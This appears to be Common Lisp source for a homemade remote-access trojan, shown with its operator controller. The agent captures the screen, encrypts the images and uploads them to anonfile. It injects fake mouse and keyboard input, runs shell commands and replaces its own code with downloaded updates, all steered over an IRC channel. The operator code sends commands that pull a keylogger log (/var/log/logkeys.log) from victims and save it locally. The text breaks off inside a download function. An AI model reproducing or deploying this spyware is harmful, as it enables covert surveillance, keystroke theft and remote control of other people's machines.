(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; wrap-img
(defun wrap-img (frmt-filename-str dims image)
  (let* ((height   (car  dims))
         (width    (cadr dims))
         (png      (get-png-obj width height image :grayscale))
         (png-seq  (get-png-seq png))
         (base64   (encrypt png-seq *irc-sess*))
         (filename (format nil frmt-filename-str
                           (format nil "~A" (get-universal-time))))
         (json     "")
         (result   (handler-case
                       (progn
                         (setf json (anon-file-upload filename base64))
                         (cl-json:decode-json-from-string json))
                     (JSON:JSON-SYNTAX-ERROR (err)
                       (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))
                     (t (err)
                       (dbg "::wrap-img error: ~A~%" (type-of err))
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    (if link
        (sendmsg link)
        (sendmsg result))
    t))

;; get_img_diff
(declaim (inline get-img-diff))

(defun get-img-diff (dims prev snap)
  (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
    (do ((qy 0 (incf qy)))
        ((= qy (car dims)))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx (cadr dims)))
        (declare (type fixnum qx))
        (setf (aref diff qy qx)
              (logxor (aref prev qy qx)
                      (aref snap qy qx)))))
    diff))

;; shot
(let ((prev)
      (cnt 9999))
  (defun shot ()
    (declare (inline get-img-diff))
    (let* ((snap (pack-img (x-snapshot)))
           (dims (array-dimensions snap)))
      (if (&gt; cnt *max-diffs-cnt*)
          (progn ;; key frame
            (wrap-img "~A" dims snap)
            (setf prev snap)
            (setf cnt 0))
          ;; else - diff
          (if (wrap-img (format nil "~~A_~A" cnt) dims
                        (get-img-diff dims prev snap))
              (progn
                (setf prev snap)
                (incf cnt))
              ;; else: wrap failure
              (setf cnt 9999))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; replace_yourself
(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun replace-yourself (link key)
  (alexandria:write-string-into-file
   (download-and-decrypt link key)
   "q.lisp" :if-exists :supersede)
  'ok)

;; (upload-code (alexandria:read-file-into-string "q.lisp") 1234567890)
;; =&gt; "/some/file"

;; (defparameter *receiver* 3784783570)
;; (defparameter *tmpkey* 1234567890)

;; (upload-code-and-send
;;  "(replace-yourself \"/some/file\" 1234567890)"
;;  *tmpkey*
;;  *receiver*)

;; remote_gui
(defun x-move (x y)
  (if (and (integerp x) (integerp y))
      (with-default-display-force (d)
        (xlib/xtest:fake-motion-event d x y))
      (error "Integer only for position, (x: ~S, y: ~S)" x y)))

(defun mklist (obj)
  (if (and
       (listp obj)
       (not (null obj)))
      obj (list obj)))

(defmacro defun-with-actions (name params actions &amp;body body)
  ;; "This macro defun a function which witch do mouse or keyboard actions,
  ;; body is called on each action."
  `(defun ,name ,params
     (mapcar
      #'(lambda (action)
          ,@body)
      (mklist ,actions))))

(defun perform-mouse-action (press? button &amp;key x y)
  (and x y (x-move x y))
  (with-default-display-force (d)
    (xlib/xtest:fake-button-event d button press?)))

(defun perform-key-action (press? keycode) ; use xev to get keycode
  (with-default-display-force (d)
    (xlib/xtest:fake-key-event d keycode press?)))

(macrolet ((def (name actions)
             `(defun-with-actions ,name
                  (&amp;key (button 1) x y)
                ,actions
                (funcall #'perform-mouse-action
                         action button :x x :y y))))
  (def x-mouse-down t)
  (def x-mouse-up nil)
  (def x-click '(t nil))
  (def x-dbclick '(t nil t nil)))

(defmacro with-scroll (pos neg clicks x y)
  `(let ((button (cond
                   ((= 0 ,clicks) nil)
                   ((&gt; 0 ,clicks) ,pos)    ; scroll up/right
                   ((&lt; 0 ,clicks) ,neg)))) ; scroll down/left
     (dotimes (_ (abs ,clicks))
       (x-click :button button :x ,x :y ,y))))

(defun x-vscroll (clicks &amp;key x y)
  (with-scroll 4 5 clicks x y))

(defun x-scroll (clicks &amp;key x y)
  (x-vscroll clicks :x x :y y))

(defun x-hscroll (clicks &amp;key x y)
  (with-scroll 7 6 clicks x y))

(macrolet ((def (name actions)
             `(defun-with-actions ,name (keycode)
                ,actions
                (funcall #'perform-key-action
                         action keycode))))
  (def x-key-down t)
  (def x-key-up nil)
  (def x-press '(t nil)))

;; (block perform-key-action-test
;;   (perform-key-action t 116)
;;   (sleep .1)
;;   (perform-key-action nil 116))

;; (defparameter *mouse-left* 1)

;; (defparameter *mouse-middle* 2)

;; (block perform-mouse-action-test
;;   (perform-mouse-action t *mouse-left* :x 100 :y 100)
;;   (sleep .1)
;;   (perform-mouse-action nil *mouse-left* :x 100 :y 100))

;; shell_command
(defvar *shell-search-paths* '("/usr/bin/" "/usr/local/bin/"))

(defparameter *bourne-compatible-shell* "/bin/sh"
  "The path to a Bourne compatible command shell in
physical pathname notation.")

(defun directory-pathname-p (pathname)
  "Does `pathname` syntactically  represent a directory?
  ---
  A directory-pathname is a pathname _without_ a filename. The three
  ways that the filename components can be missing are for it to be `nil`,
  `:unspecific` or the empty string.
  "
  (flet ((check-one (x)
           (not (null (member x '(nil :unspecific "")
                              :test 'equal)))))
    (and (check-one (pathname-name pathname))
         (check-one (pathname-type pathname)))))

(defmacro with-gensyms (syms &amp;body body)
  `(let ,(mapcar #'(lambda (s)
                     `(,s (gensym)))
                 syms)
     ,@body))

(defmacro with-stream-from-specifier ((stream)
                                      &amp;body body)
  (with-gensyms (s close? result)
    `(let ((,close? t)
           ,s
           ,result)
       (unwind-protect
            (setf ,result
                  (multiple-value-list
                   (let (,stream)
                     (setf (values ,s ,close?)
                           nil)
                     (setf ,stream ,s)
                     ,@body)))
         (when (and ,close? ,s)
           (let ((it (close-stream-specifier ,s)))
             (when it
               (setf (first ,result) it)))))
       (values-list ,result))))

(defmacro with-input ((var) &amp;body body)
  "Create an input stream from source and bind it to var within the body of the with-input form. The stream will be closed if necessary on exit."
  `(with-stream-from-specifier (,var)
     ,@body))

(defun close-stream-specifier (s)
  (if (equal (type-of s) 'string-stream)
      (prog1
          (values (get-output-stream-string s))
        (close s))
      ;; else
      (progn
        (close s)
        (values nil))))

(defun file-to-string-as-lines (stream)
  (with-output-to-string (s)
    (loop for line = (read-line stream nil :eof nil)
       until (eq line :eof) do
         (princ line s)
         (terpri s))))

(defun %shell-command (command)
  (with-input (input-stream)
    (let* ((process (sb-ext:run-program
                     *bourne-compatible-shell*
                     (list "-c" command)
                     :wait nil :input input-stream
                     :output :stream
                     :error :stream))
           (output-thread (sb-thread:make-thread
                           #'(lambda ()
                               (file-to-string-as-lines
                                (sb-impl::process-output process)))))
           (error-thread (sb-thread:make-thread
                          #'(lambda ()
                              (file-to-string-as-lines
                               (sb-impl::process-error process))))))
      (let ((error-code
             (sb-impl::process-exit-code (sb-impl::process-wait process)))
            (output-string (sb-thread:join-thread output-thread))
            (error-string (sb-thread:join-thread error-thread)))
        (close (sb-impl::process-output process))
        (close (sb-impl::process-error process))
        (values output-string error-string error-code)))))

(defun find-command-ending-in-string (command)
  (let ((checking? t))
    (loop for ch across command
       for i from 0 do
         (cond ((and checking? (char= ch #\Space))
                (return i))
               ((char= ch #\\)
                (setf checking? nil))
               (t
                (setf checking? t))))))


(defun shell-command (command)
  "Synchronously execute `command` using a Bourne-compatible shell,
   returns (values output error-output exit-status).
   --
   The `command` can be a full path to a shell executable binary
   or just its name. In the later case, the variable `*shell-search-paths*`
   will be used to find the executable.
   --
   Depending on the implementation, the variable `*bourne-compatible-shell*`
   may be used to find a shell to use in executing `command`."
  (let* ((pos-/ (position #\/ command))
         (pos-space (find-command-ending-in-string command))
         (binary (subseq command 0 (or pos-space)))
         (args (and pos-space (subseq command pos-space))))
    (when (or (not pos-/)
              (and pos-/ pos-space)
              (and pos-space
                   (&lt; pos-/ pos-space)))
      ;; no slash in the command portion, try to find the command with
      ;; our path
      (setf binary
            (or (loop for path in *shell-search-paths* do
                     (let ((full-binary (make-pathname :name binary
                                                       :defaults path)))
                       (when (and (probe-file full-binary)
                                  (directory-pathname-p full-binary))
                         (return full-binary))))
                binary)))
    (multiple-value-bind (output error status)
        (%shell-command (format nil "~a~@[ ~a~]" binary args))
      (values output error status))))

(defparameter *supervisor*
  (lambda ()
    (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                               (bt:all-threads))))
      (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                              :do (when (equal name nm)  (return th))))
               (kill (th)  (handler-case (bt:destroy-thread th)
                             ;; happens, when thread destroyed already
                             (TYPE-ERROR () nil)))
               (kill-irc (th)
                 (kill th)
                 (setf *watchdog-timer* 0)
                 (setf *connection-established-flag* nil))
               (clear ()
                 (bt:with-recursive-lock-held (*thread-operations-lock*)
                   (setf *shot-threads*
                         (remove-if-not #'(lambda (pair)
                                            (bt:thread-alive-p (car pair)))
                                        *shot-threads*)))))
        ;; if there is no irs-thread then start it
        (when (and (null (fnd "irc-th"))       ;; no irc-th
                   (null *irc-th-stop-flag*))  ;; no irc-th stop flag
          (dbg "::supervisor lambda: start irc-th~%")
          (setf *watchdog-timer* 0)
          (bt:make-thread
           #'irc :name "irc-th"
           :initial-bindings
           `((*standard-output* . ,*standard-output*)
             (*irc-thread-stop-flag* . ,*irc-th-stop-flag*))))
        ;; if there is irc-thread, but the watchdog-timer exceeds
        ;; or the flag is set - then kill it.
        (awhen (fnd "irc-th")
          (when (&gt; *watchdog-timer*  *watchdog-timer-max*)
            (dbg "::supervisor-lambda: kill irc-th by WDG~%")
            (kill-irc it))
          (when *irc-th-stop-flag*
            (dbg "::supervisor-lambda: kill irc-th by FLAG~%")
            (kill-irc it)))
        ;; kill latecomers shot-threads if there are too many
        ;; TODO: debug it!
        (when (&gt; (length *shot-threads*) *max-shot-thread-cnt*)
          (dbg "::supervisor-lambda: many threads~%")
          (loop :for (shot-th . time) :in *shot-threads* :do
               (dbg "~A . ~A~%" shot-th time)
               (when (&gt; (- (get-universal-time) time)
                        *max-shot-thread-life-time*)
                 (dbg "::supervisor-lambda: kill shot-th by lifetime exceed~%")
                 (kill shot-th)))
          (clear))
        ;; start new shot-thread (every second when connection-established)
        (clear)
        (when *connection-established-flag*
          (let ((bindings `((*standard-output* . ,*standard-output*)
                            (*shot-th-stop-flag* . ,*shot-th-stop-flag*)
                            (*irc-sess* . ,*irc-sess*)
                            (*irc-user* . ,*irc-user*)
                            (*irc-serv* . ,*irc-serv*)
                            (*irc-chan* . ,*irc-chan*)
                            (*irc-lock* . ,*irc-lock*)
                            (*irc-conn* . ,*irc-conn*)
                            (*watchdog-timer* . ,*watchdog-timer*))))
            (bt:with-recursive-lock-held (*thread-operations-lock*)
              (push (cons (bt:make-thread #'shot :name "shot-th"
                                          :initial-bindings bindings)
                          (get-universal-time))
                    *shot-threads*))))))))

(defun supervisor-loop ()
  (setf *watchdog-timer* 0)
  (tagbody
   infinite
     (when *supervisor-stop-flag*
       (go end))
     (dbg "::supervisor-loop WDG=~3,'0D~%" *watchdog-timer*)
     (funcall *supervisor*)
     (sleep *sleep-interval*)
     (incf *watchdog-timer*)
     (go infinite)
   end))

(supervisor-loop)
</pre>
</div>

<div class="org-src-container">
<pre class="src src-lisp" id="orgdcdd00d">(ql:quickload "anaphora")
(use-package :anaphora)
(ql:quickload "bordeaux-threads")
(ql:quickload "clx")
(ql:quickload "zpng")
(ql:quickload "png-read")
(ql:quickload "drakma")
(ql:quickload "cl-ppcre")
(ql:quickload "cl-base64")
(ql:quickload "prbs")
(ql:quickload "cl-irc")
(ql:quickload "cl-json")
(ql:quickload "ironclad")

(defparameter *outlock* (bt:make-recursive-lock "output-lock"))

(defmacro bprint (var)
  `(subseq (with-output-to-string (*standard-output*)
             (pprint ,var)) 1))

(defmacro dbg (msg &amp;rest params)
  "debug output with lock"
  `(bt:with-recursive-lock-held (*outlock*)
     (format t ,msg ,@params)
     (finish-output)))

(defun decode-time (universal-time)
  (multiple-value-bind (second minute hour date month year day daylight-p zone)
      (decode-universal-time universal-time)
    (format nil "~A-~A-~A ~A:~A:~A" year month date hour minute second)))

(defparameter *watchdog-timer* 0)

(defparameter *operator-stop-flag* nil)

(defparameter *sleep-interval* 3)

(defparameter *watchdog-timer-max* 100)

(defparameter *task-th-stop-flag* nil)

(defparameter *op-irc-th-stop-flag* nil)

(defparameter *op-connection-established-flag* nil)

(defparameter *op-irc-threads* nil)

(defparameter *max-task-thread-cnt* 30)

(defparameter *task-threads* nil)

(defparameter *max-task-thread-life-time* 5)

(defparameter *thread-operations-lock*
  (bt:make-recursive-lock "thread-operations-lock"))

(defstruct task
  class
  data
  code)
(defparameter *task-queue* nil)
(defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
(defun ins-task (task)
  (bt:with-lock-held (*task-queue-lock*)
    (setf *task-queue*
          (append *task-queue*
                  (list task)))))

(defun pop-task ()
  (bt:with-lock-held (*task-queue-lock*)
    (pop *task-queue*)))

(defun length-of-queue ()
  (bt:with-lock-held (*task-queue-lock*)
    (length *task-queue*)))

(defparameter *op-sess* nil)
(defparameter *op-user* nil)
(defparameter *op-serv* "irc.freenode.org")
(defparameter *op-chan* "#wntriscoming")
(defparameter *op-lock* (bt:make-recursive-lock "op-lock"))
(defparameter *op-conn* nil)

(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*op-lock*)
     (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

;; op-hook
;; op_cmd_proc
(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))

(defun op-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *op-cmd* param)
  t)

(defun op-helper ()
  (sleep 1)
  (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (cl-irc:join *op-conn* *op-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (setf *op-connection-established-flag* t))
  (sendmsg "op here"))

(defun op-loop ()
  (bt:make-thread
   #'op-helper :name "op-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*op-sess* . ,*op-sess*)
     (*op-user* . ,*op-user*)
     (*op-serv* . ,*op-serv*)
     (*op-chan* . ,*op-chan*)
     (*op-lock* . ,*op-lock*)
     (*op-conn* . ,*op-conn*)))
  (handler-case (cl-irc:read-message-loop *op-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg ":: op-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
    ))

(defun op-irc ()
  "operator's irc thread func"
  (setf *op-sess* (get-universal-time))
  (setf *op-user* (format nil "op~A" *op-sess*))
  (setf *op-conn*
        (handler-case
            (cl-irc:connect :nickname *op-user* :server *op-serv*)
          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)
          (t (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)))
  (when *op-conn*
    (dbg "::op irc conn:~A~%" *op-conn*)
    (setf *watchdog-timer* 0)
    (op-loop)))

;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; unpack_img
(defun unpack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash width 3))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8))))
    (declare (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (do ((qy 0 (incf qy)))
        ((= qy height))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx width))
        (declare (type fixnum qx))
        (let ((acc (aref image qy qx)))
          (declare (type (unsigned-byte 8) acc))
          ;; (format t "~8,'0B" acc)
          (do ((out 0 (incf out))
               (in  7 (decf in)))
              ((= 8 out))
            (declare (type fixnum out in))
            (unless (= 0 (logand acc (ash 1 in)))
              (setf (aref result qy (logior (ash qx 3) out))
                    255)))))
      ;; (format t "~%")
      )
    result))

;; TEST
;; (print
;;  (unpack-img
;;   (pack-img
;;    (x-snapshot :width 31 :height 23))))

;; TEST
;; (time
;;  (let* ((image  (load-png "FILE1088"))
;;         (unpack (unpack-img image))
;;         (dims (array-dimensions unpack)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              unpack
;;              :grayscale)))

(defun shot-downloader (str src)
  (let* ((key (parse-integer (subseq src 1)))
         (enc (anon-file-download str))
         (dec (decrypt enc key))
         (png (let ((png-read::*png-file* "fake-file"))
                (flex:with-input-from-sequence (stream dec)
                  (png-read:read-png-datastream stream))))
         (image-data (png-read:image-data png))
         ;; reverse
         (dims   (subseq (array-dimensions image-data) 0 2))
         (height (cadr dims))
         (width  (car  dims))
         (image ;; меняем размерности X и Y местами
          (let ((result (make-array (list height width)
                                    :element-type '(unsigned-byte 8))))
            (do ((y 0 (incf y)))
                ((= y height))
              (do ((x 0 (incf x)))
                  ((= x width))
                (setf (aref result y x)
                      (aref image-data x y))))
            result))
         ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
         ;; (img (if (not dif)
         ;;          (setf prev image)
         ;;          ;; else
         ;;          (setf prev (get-img-diff dims prev image))))
         (img image)
         ;; unpacking
         (unpack (unpack-img img))
         (unpack-dims (array-dimensions unpack))
         (new-width (cadr unpack-dims))
         (fname-str (multiple-value-bind (match-p result)
                        (ppcre:scan-to-strings "/.*/(.*)" str)
                      (elt result 0))))
    (let* ((png (make-instance 'zpng:png
                               :width new-width
                               :height height
                               :color-type :grayscale))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height new-width (zpng:samples-per-pixel png))
                    :displaced-to unpack :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
